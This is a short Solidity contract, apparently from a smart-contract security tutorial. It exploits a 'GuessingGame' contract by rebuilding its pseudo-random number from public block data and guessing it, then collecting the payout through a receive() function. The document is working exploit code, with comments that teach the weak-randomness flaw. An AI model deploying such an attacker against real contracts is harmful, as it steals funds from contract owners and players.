// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./GuessingGame.sol";

contract Attack {
    GuessingGame game;

    // Creates an instance of GuessingGame contract with the help of `gameAddress`
    constructor(address gameAddress) {
        game = GuessingGame(gameAddress);
    }

    // Attacks the `GuessingGame` contract by guessing the exact number because `blockhash` and `block.timestamp`
    // is accessible publicly
    function attack() public {
        // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
        // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
        // which is further converted to a `uint`.
        // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32
        uint256 _guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number / 2), block.timestamp)
            )
        );
        game.guess(_guess);
    }

    // Gets called when the contract receives ether
    receive() external payable {}
}
